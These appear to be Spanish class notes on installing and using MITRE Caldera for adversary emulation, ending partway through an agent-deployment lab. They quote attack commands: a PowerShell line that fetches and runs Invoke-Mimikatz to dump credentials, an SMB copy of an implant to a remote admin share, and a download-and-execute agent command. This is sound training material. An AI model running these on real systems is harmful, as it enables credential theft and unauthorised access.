---
title: Clase 05 - Caldera Framework - EmulaciÃ³n de Adversarios con MITRE ATT&CK
date: 2025-11-22 08:00:00 -0500
categories: [Laboratorios, MITRE]
tags: [caldera, emulaciÃ³n-adversaria, purple-team, mitre-attack, red-team, blue-team, cybersecurity]
---

**ENLACES DE LA GRABACIÃ“N DE LA CLASE**: Clase 05 - Caldera Framework

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#87CEEB">0. IntroducciÃ³n a Caldera Framework</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

### Â¿QuÃ© es MITRE Caldera?

**Caldera** es una plataforma de ciberseguridad desarrollada por **MITRE Corporation** diseÃ±ada para automatizar la emulaciÃ³n de adversarios, asistir a equipos rojos (Red Teams) manuales y automatizar la respuesta a incidentes. Se trata de un proyecto de investigaciÃ³n activo que permite a los profesionales de seguridad simular ataques realistas basados en el framework **MITRE ATT&CK**.

### CaracterÃ­sticas principales

- **EmulaciÃ³n de adversarios automatizada**: Ejecuta cadenas de ataque completas de manera autÃ³noma
- **Framework MITRE ATT&CK integrado**: Todas las tÃ©cnicas estÃ¡n mapeadas a tÃ¡cticas y tÃ©cnicas ATT&CK
- **Plataforma modular**: Sistema de plugins que expande las capacidades del nÃºcleo
- **Interfaz web intuitiva**: Control completo a travÃ©s de navegador web
- **API REST**: AutomatizaciÃ³n y integraciÃ³n con otras herramientas de seguridad
- **CÃ³digo abierto**: Disponible gratuitamente para uso educativo y profesional

### RelaciÃ³n con MITRE ATT&CK

**MITRE ATT&CK** (Adversarial Tactics, Techniques, and Common Knowledge) es una base de conocimiento globalmente accesible de tÃ¡cticas y tÃ©cnicas adversarias basadas en observaciones del mundo real. Caldera utiliza este framework para:

1. **Mapear cada acciÃ³n**: Cada habilidad (ability) en Caldera corresponde a una tÃ©cnica ATT&CK especÃ­fica (ejemplo: T1003.001, T1059.001)
2. **Simular adversarios reales**: Perfiles de adversarios que replican grupos APT documentados
3. **Validar defensas**: Probar la detecciÃ³n de controles de seguridad contra tÃ©cnicas conocidas
4. **Educar equipos**: Entrenar a profesionales en tÃ¡cticas, tÃ©cnicas y procedimientos (TTPs) reales

### Componentes principales de Caldera

| Componente | DescripciÃ³n |
|------------|-------------|
| **Agentes** | Implantes C2 desplegados en sistemas objetivo que ejecutan comandos |
| **Habilidades (Abilities)** | TÃ©cnicas individuales ATT&CK que pueden ejecutarse (ejemplo: escaneo de red, dumping de credenciales) |
| **Adversarios** | Perfiles de ataque que definen secuencias de habilidades a ejecutar |
| **Operaciones** | CampaÃ±as de ataque en vivo que ejecutan perfiles de adversarios contra agentes desplegados |
| **Planificadores (Planners)** | LÃ³gica que determina cÃ³mo y cuÃ¡ndo ejecutar habilidades |
| **Fuentes (Sources)** | Conocimiento inicial sobre el entorno objetivo |
| **Plugins** | MÃ³dulos que extienden las capacidades de Caldera |

### Casos de uso en ciberseguridad

#### 1. Entrenamiento de Purple Team
Ejercicios coordinados donde el equipo rojo ejecuta ataques y el equipo azul practica la detecciÃ³n y respuesta.

#### 2. ValidaciÃ³n de controles de seguridad
Verificar que EDR, SIEM y otras soluciones de seguridad detectan tÃ©cnicas especÃ­ficas de ATT&CK.

#### 3. IngenierÃ­a de detecciÃ³n
Generar trÃ¡fico malicioso conocido para desarrollar y validar reglas de detecciÃ³n (Sigma, YARA, Snort).

#### 4. EducaciÃ³n en ciberseguridad
Plataforma prÃ¡ctica para enseÃ±ar tÃ¡cticas, tÃ©cnicas y procedimientos de atacantes reales.

#### 5. Red Team automation
Automatizar tareas repetitivas durante compromisos de red team, liberando tiempo para actividades mÃ¡s complejas.

### VersiÃ³n utilizada en este laboratorio

Esta guÃ­a utiliza **Caldera 5.3.0**, la versiÃ³n mÃ¡s reciente al momento de la escritura. Esta versiÃ³n incluye:

- 162 habilidades distribuidas en 11 tÃ¡cticas ATT&CK
- Soporte para Windows, Linux y macOS
- Plugin EMU con planes de emulaciÃ³n CTID (APT29, FIN7, Wizard Spider, etc.)
- IntegraciÃ³n con Atomic Red Team
- Interfaz VueJS renovada

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#87CEEB">1. InstalaciÃ³n de Caldera Framework</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

### Requisitos del sistema

#### Requisitos de hardware
- **RAM**: MÃ­nimo 8GB (recomendado 16GB para operaciones complejas)
- **CPU**: MÃ­nimo 2 nÃºcleos
- **Espacio en disco**: 5GB libres

#### Requisitos de software
- **Python**: 3.10 o superior (con pip3)
- **Sistema operativo**: Linux, macOS o Windows (WSL recomendado)
- **GoLang**: 1.24+ (opcional, para compilar agentes personalizados)
- **NodeJS**: v16+ (opcional, para desarrollo de la interfaz)
- **Docker**: 20.10+ (si se usa instalaciÃ³n con contenedores)

### MÃ©todo 1: InstalaciÃ³n con Docker (Recomendado para laboratorios)

Docker proporciona la forma mÃ¡s rÃ¡pida y consistente de ejecutar Caldera, ideal para entornos educativos.

#### OpciÃ³n A: Usar imagen pre-construida

```bash
# Descargar y ejecutar la imagen oficial de Caldera
docker run -p 8888:8888 ghcr.io/mitre/caldera:latest
```

#### OpciÃ³n B: Construir imagen local

```bash
# Clonar el repositorio
git clone https://github.com/mitre/caldera.git --recursive
cd caldera

# Construir imagen Docker (variante completa)
docker build --build-arg VARIANT=full -t caldera .

# Ejecutar contenedor
docker run -it -p 8888:8888 caldera
```

#### Variantes de Docker disponibles

- **full**: Incluye todos los archivos para uso offline (plugins emu y atomic completos)
- **slim**: Descarga datos de emu/atomic bajo demanda (imagen mÃ¡s pequeÃ±a)

#### Puertos expuestos por defecto

| Puerto | Protocolo | Uso |
|--------|-----------|-----|
| 8888 | HTTP | Interfaz web y beacons de agentes |
| 8443 | HTTPS | Interfaz segura (requiere plugin SSL) |
| 7010 | TCP | Canal C2 TCP |
| 7011 | UDP | Canal C2 UDP |
| 7012 | WebSocket | Canal C2 WebSocket |
| 8853 | DNS | TÃºnel DNS C2 |
| 2222 | FTP | Canal C2 FTP |
| 8022 | SSH | TÃºnel SSH |

#### Persistencia de datos con Docker

Por defecto, los datos en Docker son efÃ­meros. Para mantener operaciones y configuraciones:

```bash
# Crear volumen para persistencia
docker volume create caldera-data

# Ejecutar con volumen montado
docker run -it \
  -p 8888:8888 \
  -v caldera-data:/usr/src/app/data \
  ghcr.io/mitre/caldera:latest
```

#### ConfiguraciÃ³n personalizada con Docker

```bash
# Montar archivo de configuraciÃ³n personalizado
docker run -it \
  -p 8888:8888 \
  -v $(pwd)/mi-config.yml:/usr/src/app/conf/local.yml \
  ghcr.io/mitre/caldera:latest
```

### MÃ©todo 2: InstalaciÃ³n local (Desarrollo y personalizaciÃ³n)

La instalaciÃ³n local proporciona mayor flexibilidad para personalizar Caldera y desarrollar plugins.

#### Paso 1: Preparar entorno virtual de Python

```bash
# Crear entorno virtual (recomendado)
python3 -m venv .calderavenv

# Activar entorno virtual
source .calderavenv/bin/activate  # Linux/macOS
# .calderavenv\Scripts\activate   # Windows
```

#### Paso 2: Clonar repositorio

```bash
# Clonar con submÃ³dulos (importante: incluye plugins)
git clone https://github.com/mitre/caldera.git --recursive
cd caldera
```

#### Paso 3: Instalar dependencias

```bash
# Instalar dependencias de Python
pip3 install -r requirements.txt
```

#### Dependencias principales instaladas

- `aiohttp==3.12.14` - Servidor HTTP asÃ­ncrono
- `jinja2==3.1.6` - Motor de plantillas
- `pyyaml==6.0.1` - Procesamiento de configuraciÃ³n
- `cryptography==44.0.1` - Cifrado de comunicaciones
- `websockets==15.0` - ComunicaciÃ³n con agentes
- `marshmallow==3.20.1` - SerializaciÃ³n de datos

#### Paso 4: Iniciar servidor Caldera

```bash
# Primera ejecuciÃ³n (construye interfaz VueJS)
python3 server.py --insecure --build

# Ejecuciones posteriores
python3 server.py --insecure
```

#### Opciones de lÃ­nea de comandos

```bash
python3 server.py --help

Opciones disponibles:
  --insecure        Usar configuraciÃ³n por defecto (credenciales red/admin)
  --build           Construir interfaz VueJS (requerido en primera ejecuciÃ³n)
  --log LEVEL       Nivel de logging (DEBUG, INFO, WARNING, ERROR, CRITICAL)
  --fresh           Eliminar object_store al iniciar (reseteo completo)
  -P PLUGINS        Iniciar con plugins especÃ­ficos
```

### VerificaciÃ³n de la instalaciÃ³n

#### Acceder a la interfaz web

1. Abrir navegador web
2. Navegar a: `http://localhost:8888`
3. Iniciar sesiÃ³n con credenciales por defecto (modo insecure):
   - **Usuario**: `red` o `admin`
   - **ContraseÃ±a**: `admin`
   - **Usuario Blue Team**: `blue` / `admin`

#### Verificar plugins cargados

En la interfaz web:
1. Hacer clic en el menÃº lateral
2. Navegar a **Plugins**
3. Verificar que los plugins estÃ©n cargados:
   - âœ“ Sandcat (agente por defecto)
   - âœ“ Stockpile (habilidades y adversarios)
   - âœ“ Training (curso de certificaciÃ³n)
   - âœ“ Magma (interfaz VueJS)
   - âœ“ Emu (emulaciÃ³n de adversarios reales)
   - âœ“ Atomic (Atomic Red Team)
   - âœ“ Y otros plugins habilitados

### Consideraciones de seguridad

> âš ï¸ **ADVERTENCIA DE SEGURIDAD**
>
> El equipo de Caldera recomienda encarecidamente ejecutar el servidor en un entorno seguro/red aislada, sin exposiciÃ³n a Internet. La interfaz web de Caldera no tiene una aplicaciÃ³n web endurecida y exhaustivamente probada con pentesting, sino solo caracterÃ­sticas bÃ¡sicas de autenticaciÃ³n y seguridad.

#### Mejores prÃ¡cticas para laboratorios educativos

1. **Red aislada**: Ejecutar Caldera en red de laboratorio sin conexiÃ³n a Internet
2. **Modo insecure solo para entrenamiento**: Usar `--insecure` Ãºnicamente en entornos controlados
3. **SegmentaciÃ³n de red**: Aislar sistemas objetivo de redes de producciÃ³n
4. **MÃ¡quinas virtuales**: Usar VMs o contenedores para sistemas objetivo
5. **DocumentaciÃ³n de ejercicios**: Registrar todas las actividades para cumplimiento
6. **Monitoreo**: Supervisar actividad de agentes durante ejercicios

#### ConfiguraciÃ³n de producciÃ³n

Para entornos de producciÃ³n, NO usar el flag `--insecure`:

```bash
# Primera ejecuciÃ³n: genera conf/local.yml con configuraciÃ³n segura
python3 server.py --build

# El servidor solicitarÃ¡:
# - Nueva contraseÃ±a de administrador
# - Clave de cifrado personalizada
# - ConfiguraciÃ³n de red
```

Luego editar `/conf/local.yml` para personalizar:
- Credenciales de usuario
- API keys
- Claves de cifrado
- Certificados SSL (con plugin SSL)

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#87CEEB">2. Conceptos fundamentales de Caldera</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

### Arquitectura general

Caldera sigue una arquitectura cliente-servidor de comando y control (C2):

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    Operador (Navegador Web)                 â”‚
â”‚                    http://localhost:8888                    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                             â”‚ HTTPS/API REST
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                     Servidor Caldera                         â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚ Agentes  â”‚  â”‚Adversariosâ”‚  â”‚Habilidadesâ”‚  â”‚Planificador â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                   â”‚
â”‚  â”‚Operacionesâ”‚  â”‚  Fuentes â”‚  â”‚  Plugins â”‚                   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                             â”‚ C2 Channels (HTTP/TCP/DNS/etc)
         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
         â”‚                   â”‚                   â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Agente Sandcat â”‚  â”‚ Agente Sandcat â”‚  â”‚ Agente Sandcat â”‚
â”‚   (Windows)     â”‚  â”‚    (Linux)     â”‚  â”‚    (macOS)     â”‚
â”‚ 192.168.1.10    â”‚  â”‚ 192.168.1.20   â”‚  â”‚ 192.168.1.30   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Agentes (Agents)

Los **agentes** son implantes de comando y control (C2) que se despliegan en sistemas objetivo. ActÃºan como "pies en el suelo" que ejecutan comandos enviados por el servidor Caldera.

#### Agente por defecto: Sandcat

**Sandcat** es el agente predeterminado de Caldera con las siguientes caracterÃ­sticas:

- **Lenguaje**: Escrito en GoLang (compilado estÃ¡ticamente)
- **Multiplataforma**: Soporta Windows, Linux y macOS
- **Canales C2**: HTTP/HTTPS, TCP, UDP, WebSocket, DNS, SSH, FTP
- **Ejecutores**: PowerShell, CMD, Bash, SH, PowerShell Core
- **TamaÃ±o**: ~7-10MB (incluye runtime de Go)
- **OfuscaciÃ³n**: Nombre de proceso personalizable (por defecto: `splunkd`)

#### Propiedades de un agente

| Propiedad | DescripciÃ³n |
|-----------|-------------|
| **PAW** | Identificador Ãºnico del agente (generado automÃ¡ticamente) |
| **Hostname** | Nombre del sistema comprometido |
| **Platform** | Sistema operativo (windows, linux, darwin) |
| **Executors** | IntÃ©rpretes disponibles (psh, cmd, sh, bash, pwsh) |
| **Group** | AgrupaciÃ³n lÃ³gica (ej: "red", "blue", "kali", "domain-users") |
| **Privilege** | Nivel de privilegios (User, Elevated, SYSTEM) |
| **Contact** | MÃ©todo C2 utilizado (HTTP, TCP, etc.) |
| **Sleep** | Intervalo de beacon (tiempo entre comunicaciones) |
| **Status** | Estado (alive, trusted, untrusted, dead) |

#### Otros agentes disponibles

- **Manx**: Agente de reverse shell ligero
- **Ragdoll**: Implante basado en HTML/JavaScript

#### ConfiguraciÃ³n de agentes

Archivo: `/conf/agents.yml`

```yaml
implant_name: splunkd          # Nombre del proceso para camuflaje
sleep_min: 30                  # Intervalo mÃ­nimo de beacon (segundos)
sleep_max: 60                  # Intervalo mÃ¡ximo de beacon (segundos)
untrusted_timer: 90            # Tiempo antes de marcar agente como no confiable
watchdog: 0                    # Temporizador de auto-terminaciÃ³n (0=deshabilitado)
```

### Habilidades (Abilities)

Las **habilidades** son tÃ©cnicas individuales de ATT&CK que pueden ejecutarse en sistemas objetivo. Cada habilidad representa una acciÃ³n especÃ­fica como escanear la red, dumping de credenciales, o exfiltraciÃ³n de datos.

#### Estructura de una habilidad

Archivo de ejemplo: `/plugins/stockpile/data/abilities/discovery/85341c8c-4ecb-4579-8f53-43e3e91d7617.yml`

```yaml
id: 85341c8c-4ecb-4579-8f53-43e3e91d7617
name: Collect ARP details
description: Localizar todas las IPs y FQDNs activos en la red
tactic: discovery
technique:
  attack_id: T1018
  name: Remote System Discovery
platforms:
  darwin:
    sh:
      command: arp -a
      parsers:
        plugins.stockpile.app.parsers.ipaddr:
          - source: remote.host.ip
  linux:
    sh:
      command: arp -a
  windows:
    psh,cmd:
      command: arp -a
```

#### Componentes de una habilidad

1. **ID**: Identificador Ãºnico UUID
2. **Name**: Nombre descriptivo
3. **Description**: ExplicaciÃ³n de la acciÃ³n
4. **Tactic**: TÃ¡ctica ATT&CK (discovery, credential-access, etc.)
5. **Technique**: TÃ©cnica ATT&CK especÃ­fica (T1018, T1003.001, etc.)
6. **Platforms**: Comandos especÃ­ficos por plataforma
7. **Parsers**: ExtracciÃ³n de datos (facts) de la salida del comando
8. **Cleanup**: Comandos opcionales para limpiar artefactos

#### TÃ¡cticas ATT&CK cubiertas en Caldera

Caldera incluye 162 habilidades distribuidas en 11 tÃ¡cticas:

1. **Collection** - RecolecciÃ³n de datos del objetivo
2. **Command-and-Control** - Comunicaciones C2
3. **Credential-Access** - ObtenciÃ³n de credenciales
4. **Defense-Evasion** - EvasiÃ³n de defensas
5. **Discovery** - Reconocimiento del entorno
6. **Execution** - EjecuciÃ³n de cÃ³digo
7. **Exfiltration** - ExtracciÃ³n de datos
8. **Impact** - Impacto destructivo
9. **Lateral-Movement** - Movimiento lateral
10. **Persistence** - Persistencia en el sistema
11. **Privilege-Escalation** - EscalaciÃ³n de privilegios

#### Ejemplo: Habilidad de Credential Access (T1003.001)

```yaml
name: Run PowerKatz
description: Usar powerkatz para ejecutar mimikatz y extraer credenciales
tactic: credential-access
technique:
  attack_id: T1003.001
  name: OS Credential Dumping - LSASS Memory
platforms:
  windows:
    psh:
      command: |
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
        $web = (New-Object System.Net.WebClient);
        $result = $web.DownloadString("https://raw.githubusercontent.com/.../Invoke-Mimikatz.ps1");
        iex $result; Invoke-Mimikatz -DumpCreds
```

#### Ejemplo: Habilidad de Lateral Movement (T1021.002)

```yaml
name: Copy 54ndc47 (SMB)
description: Copiar agente 54ndc47 a host remoto vÃ­a SMB
tactic: lateral-movement
technique:
  attack_id: T1021.002
  name: Remote Services - SMB/Windows Admin Shares
platforms:
  windows:
    psh:
      command: |
        $path = "sandcat.go-windows";
        $drive = "\\#{remote.host.fqdn}\C$";
        Copy-Item -v -Path $path -Destination $drive"\Users\Public\s4ndc4t.exe";
      cleanup: |
        Remove-Item -Path $drive"\Users\Public\s4ndc4t.exe" -Force;
```

### Adversarios (Adversaries)

Los **adversarios** son perfiles de ataque que definen secuencias de habilidades a ejecutar. Representan campaÃ±as completas de atacantes o grupos APT.

#### Estructura de un adversario

Archivo: `/plugins/stockpile/data/adversaries/de07f52d-9928-4071-9142-cb1d3bd851e8.yml`

```yaml
id: de07f52d-9928-4071-9142-cb1d3bd851e8
name: Ransack
description: Descubrir detalles del host y robar archivos sensibles
atomic_ordering:
  - 90c2efaa-8205-480d-8bb6-61d90dbaf81b  # Buscar archivos sensibles
  - c0da588f-79f0-4263-8998-7496b1a40596  # Usuario activo
  - c1cd6388-3ced-48c7-a511-0434c6ba8f48  # Usuarios locales
  - 85341c8c-4ecb-4579-8f53-43e3e91d7617  # Detalles ARP
  - b6b105b9-41dc-490b-bc5c-80d699b82ce8  # InformaciÃ³n de red
  # ... mÃ¡s habilidades
```

#### Adversarios disponibles en Stockpile

- **Ransack**: Descubrimiento y exfiltraciÃ³n de datos (18 pasos)
- **Advanced Thief via DropBox**: BÃºsqueda, staging y exfiltraciÃ³n de archivos
- **Check**: VerificaciÃ³n de configuraciÃ³n de plataforma

#### Adversarios del mundo real (Plugin EMU)

El plugin EMU proporciona planes de emulaciÃ³n CTID de grupos APT reales:

- **APT29** (Cozy Bear)
- **Carbanak** (Financial cybercrime)
- **FIN6** (Payment card theft)
- **FIN7** (Carbanak-like financial attacks)
- **Menu Pass** (APT10, Stone Panda)
- **Wizard Spider** (Trickbot, Ryuk ransomware)
- **OilRig** (APT34, Helix Kitten)

### Operaciones (Operations)

Las **operaciones** son campaÃ±as de ataque en vivo que ejecutan perfiles de adversarios contra agentes desplegados.

#### Propiedades de una operaciÃ³n

| Propiedad | DescripciÃ³n |
|-----------|-------------|
| **Name** | Nombre identificador de la operaciÃ³n |
| **Adversary** | Perfil de adversario a ejecutar |
| **Group** | Grupo de agentes objetivo |
| **Planner** | LÃ³gica de ejecuciÃ³n (atomic, batch, buckets) |
| **Source** | Conocimiento inicial (facts) sobre el objetivo |
| **Autonomous** | Modo: 1 (automÃ¡tico) o 0 (manual paso a paso) |
| **Obfuscator** | MÃ©todo de ofuscaciÃ³n de comandos |
| **Jitter** | AleatorizaciÃ³n de beacons (ej: "2/8" = Â±2 segundos) |
| **State** | Estado actual (running, paused, finished, cleanup) |

#### Estados de una operaciÃ³n

- **running**: Ejecutando habilidades activamente
- **paused**: Pausada por el operador
- **run_one_link**: Ejecutar solo siguiente habilidad (modo manual)
- **out_of_time**: Tiempo agotado
- **finished**: Completada exitosamente
- **cleanup**: Ejecutando comandos de limpieza

### Planificadores (Planners)

Los **planificadores** determinan la lÃ³gica de ejecuciÃ³n de habilidades durante una operaciÃ³n.

#### Atomic Planner (Por defecto)

Ejecuta habilidades secuencialmente:
1. Espera a que una habilidad complete antes de la siguiente
2. Procesa basÃ¡ndose en el `atomic_ordering` del adversario
3. Ejemplo: Agente A ejecuta (A1 â†’ A2 â†’ A3) mientras Agente B ejecuta (B1 â†’ B2 â†’ B3) en paralelo

#### Otros planificadores

- **Batch Planner**: Ejecuta mÃºltiples habilidades en paralelo
- **Buckets Planner**: Agrupa habilidades por tÃ¡ctica ATT&CK

### Fuentes (Sources) y Hechos (Facts)

Las **fuentes** proporcionan conocimiento inicial sobre el entorno objetivo que las habilidades pueden utilizar.

#### Ejemplo de fuente

Archivo: `/data/sources/8dcbdf42-f53a-49c9-8e7d-a8d7ad44b25b.yml`

```yaml
id: 8dcbdf42-f53a-49c9-8e7d-a8d7ad44b25b
name: OilRig (Emu)
facts:
  - trait: initial.target.user
    value: gosta
  - trait: initial.target.password
    value: Bl1nk182@g
  - trait: network.domain.name
    value: boombox.local
  - trait: caldera.server.ip
    value: 192.168.10.4
```

#### Â¿CÃ³mo funcionan los facts?

Los facts permiten que las habilidades se encadenen:

1. **Habilidad 1** ejecuta escaneo ARP â†’ descubre `remote.host.ip: 192.168.1.50`
2. **Habilidad 2** usa `#{remote.host.ip}` para copiar archivo vÃ­a SMB
3. **Habilidad 3** usa `#{remote.host.ip}` para ejecutar comando remoto

### Sistema de plugins

Caldera utiliza una arquitectura modular donde los plugins extienden la funcionalidad del nÃºcleo.

#### Plugins incluidos por defecto

| Plugin | DescripciÃ³n |
|--------|-------------|
| **Sandcat** | Agente C2 por defecto (GoLang) |
| **Stockpile** | 162 habilidades y perfiles de adversarios |
| **Training** | Curso de certificaciÃ³n integrado |
| **Magma** | Interfaz web VueJS |
| **Emu** | Planes de emulaciÃ³n CTID (APT29, FIN7, etc.) |
| **Atomic** | IntegraciÃ³n con Atomic Red Team |
| **Compass** | Visualizaciones ATT&CK Navigator |
| **Debrief** | Reportes de operaciones |
| **Fieldmanual** | DocumentaciÃ³n integrada |
| **GameBoard** | VisualizaciÃ³n conjunta red/blue team |
| **Human** | SimulaciÃ³n de ruido de endpoint |
| **Manx** | Agente de reverse shell |
| **Response** | AutomatizaciÃ³n de respuesta a incidentes |
| **Access** | Herramientas de acceso inicial |
| **Builder** | CompilaciÃ³n dinÃ¡mica de payloads |

#### HabilitaciÃ³n de plugins

Archivo: `/conf/default.yml`

```yaml
plugins:
  - access
  - atomic
  - compass
  - debrief
  - emu
  - fieldmanual
  - gameboard
  - human
  - manx
  - response
  - sandcat
  - stockpile
  - training
```

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#87CEEB">3. Laboratorio 1 - Despliegue del primer agente</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

### Objetivos del laboratorio

1. Comprender el proceso de despliegue de agentes
2. Establecer comunicaciÃ³n C2 con el servidor Caldera
3. Verificar las propiedades del agente
4. Explorar la interfaz de gestiÃ³n de agentes

### Requisitos previos

- Servidor Caldera ejecutÃ¡ndose en `http://localhost:8888`
- Sistema objetivo (VM Linux recomendada para primera prÃ¡ctica)
- Acceso de terminal al sistema objetivo
- Conectividad de red entre servidor y objetivo

### Escenario del laboratorio

Se desplegarÃ¡ un agente **Sandcat** en un sistema Linux de prueba. Este agente establecerÃ¡ comunicaciÃ³n HTTP con el servidor Caldera y quedarÃ¡ disponible para ejecutar operaciones.

### Paso 1: Acceder a la pestaÃ±a de Agentes

1. Abrir navegador web y navegar a `http://localhost:8888`
2. Iniciar sesiÃ³n con credenciales:
   - Usuario: `red`
   - ContraseÃ±a: `admin`
3. En el menÃº lateral izquierdo, hacer clic en **"Agents"**
4. Observar que inicialmente la lista de agentes estÃ¡ vacÃ­a

### Paso 2: Generar comando de despliegue

1. En la pestaÃ±a Agents, hacer clic en el botÃ³n **"deploy an agent"**
2. Se presentarÃ¡ un modal con opciones de despliegue
3. Configurar las siguientes opciones:

   | OpciÃ³n | Valor recomendado |
   |--------|-------------------|
   | **Agent** | Sandcat |
   | **Platform** | linux |
   | **Delivery Method** | HTTP |
   | **Group** | red |

4. El sistema generarÃ¡ automÃ¡ticamente un comando de despliegue

### Paso 3: Comprender el comando de despliegue

El comando generado tendrÃ¡ la siguiente estructura:

```bash
server="http://192.168.1.100:8888";
curl -s -X POST \
  -H "file:sandcat.go" \
  -H "platform:linux" \
  -H "server:$server" \
  -H "group:red" \
  $server/file/download > /tmp/sandcat-linux && \
chmod +x /tmp/sandcat-linux && \
/tmp/sandcat-linux -server $server -group red -v
```

#### AnÃ¡lisis del comando

1. **Variable de servidor**: Define la direcciÃ³n del servidor Caldera
   ```bash
   server="http://192.168.1.100:8888"
   ```

2. **Descarga del agente**: Utiliza curl con headers personalizados
   ```bash
   curl -s -X POST \
     -H "file:sandcat.go" \      # Solicita el binario de Sandcat
     -H "platform:linux" \        # Especifica plataforma Linux
     -H "server:$server" \        # DirecciÃ³n del servidor C2
     -H "group:red" \             # Grupo lÃ³gico del agente
     $server/file/download        # Endpoint de descarga
   ```

3. **Permisos de ejecuciÃ³n**: Hace el binario ejecutable
   ```bash
   chmod +x /tmp/sandcat-linux
   ```

4. **EjecuciÃ³n del agente**: Inicia el agente con parÃ¡metros
   ```bash
   /tmp/sandcat-linux -server $server -group red -v
   ```
   - `-server`: DirecciÃ³n del servidor C2
   - `-group`: Grupo de membresÃ­a
   - `-v`: Modo verbose (depuraciÃ³n)

### Paso 4: Ejecutar el comando en el sistema objetivo

1. Copiar el comando completo generado por Caldera
2. Conectarse al sistema Linux objetivo vÃ­a SSH o terminal local
3. Pegar y ejecutar el comando
4. Observar la salida verbose del agente:

```
[*] Starting sandcat agent
[*] Server: http://192.168.1.100:8888
[*] Group: red
[*] Platform: linux
[*] Executors: sh, bash
[*] Beaconing every 30-60 seconds
[*] Initial beacon sent
[*] Successfully connected to C2 server
```

### Paso 5: Verificar conexiÃ³n del agente en Caldera

1. Regresar a la interfaz web de Caldera
2. En la pestaÃ±a **Agents**, actualizar la pÃ¡gina si es necesario
3. El nuevo agente debe aparecer en la lista con informaciÃ³n detallada:

#### InformaciÃ³n del agente desplegado

| Campo | Ejemplo | DescripciÃ³n |
|-------|---------|-------------|
| **PAW** | `c3f4a7b2` | Identificador Ãºnico del agente |
| **Hostname** | `ubuntu-lab` | Nombre del sistema comprometido |
| **Platform** | `linux` | Sistema operativo |
| **Executors** | `sh, bash` | IntÃ©rpretes disponibles |
| **Group** | `red` | Grupo asignado |
| **Privilege** | `User` | Nivel de privilegios actual |
| **Contact** | `HTTP` | MÃ©todo C2 utilizado |
| **Last Seen** | `5 seconds ago` | Ãšltima comunicaciÃ³n |
| **Status** | `alive` | Estado del agente |

### Paso 6: Explorar propiedades del agente

1. Hacer clic en el agente para expandir sus detalles
2. Observar secciones adicionales:
   - **Facts**: Datos conocidos sobre el sistema
   - **Links**: Historial de comandos ejecutados
   - **Abilities**: Habilidades aplicables a este agente

### Paso 7: Modificar propiedades del agente (opcional)

